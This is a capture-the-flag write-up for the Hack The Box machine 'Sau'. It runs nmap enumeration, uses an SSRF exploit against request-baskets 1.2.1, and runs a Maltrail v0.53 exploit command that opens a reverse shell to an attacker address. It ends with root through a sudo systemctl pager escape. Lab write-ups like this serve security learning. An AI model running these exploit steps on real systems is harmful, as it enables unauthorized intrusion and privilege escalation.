---
title: HTB Sau
author: kei5uke
draft: true
description: Writeup for HTB Sau
tags:
  - linux
  - writeup
---

# Enumeration

```
nmap 10.129.229.26 -p- -sC -sV -A -T4 --min-rate 10000 -oN nmap_tcp.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-14 12:38 EDT
Nmap scan report for 10.129.229.26
Host is up (0.028s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     X-Content-Type-Options: nosniff
|     Date: Sun, 14 Jul 2024 13:39:47 GMT
|     Content-Length: 75
|     invalid basket name; the name does not match pattern: ^[wd-_\.]{1,250}$
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Sun, 14 Jul 2024 13:39:18 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Sun, 14 Jul 2024 13:39:18 GMT
|_    Content-Length: 0
```

```
 nmap -sU -T4 --top-port=100 10.129.229.26 -oN nmap_udp.txt             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-14 12:44 EDT
Warning: 10.129.229.26 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.229.26
Host is up (0.032s latency).
Not shown: 88 closed udp ports (port-unreach)
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
135/udp   open|filtered msrpc
427/udp   open|filtered svrloc
623/udp   open|filtered asf-rmcp
1026/udp  open|filtered win-rpc
1718/udp  open|filtered h225gatedisc
2222/udp  open|filtered msantipiracy
5000/udp  open|filtered upnp
10000/udp open|filtered ndmp
17185/udp open|filtered wdbrpc
33281/udp open|filtered unknown
49152/udp open|filtered unknown
```

## HTTP 5555

This page contains application name and its version: request-baskets 1.2.1

This version contains SSRF vulnerability

https://github.com/entr0pie/CVE-2023-27163

`./CVE-2023-27163.sh [http://10.129.229.26:55555/](http://10.129.229.26:55555/) [http://localhost/](http://localhost/)` 

This leads to internal port 80

## HTTP 80

This application and its version are Maltrail v0.53

Found exploit:

[Maltrail-v0.53-Exploit/exploit.py at main · spookier/Maltrail-v0.53-Exploit](https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py#L32)

`python3 maltrail_exploit.py 10.10.14.44 443 [http://10.129.229.26:55555/fjxhjy](http://10.129.229.26:55555/fjxhjy)`

This exploit leads to reverse shell

## Shell

Got shell as user: puma

This user is allowed to run this command as sudo

User puma may run the following commands on sau:
(ALL : ALL) NOPASSWD: `/usr/bin/systemctl status trail.service`

[systemctl
            
            |
            
            GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/)

This leads to default pager page, and executing `!sh` leads to root shell

## Root

![[HTB Sau - Untitled.png]]
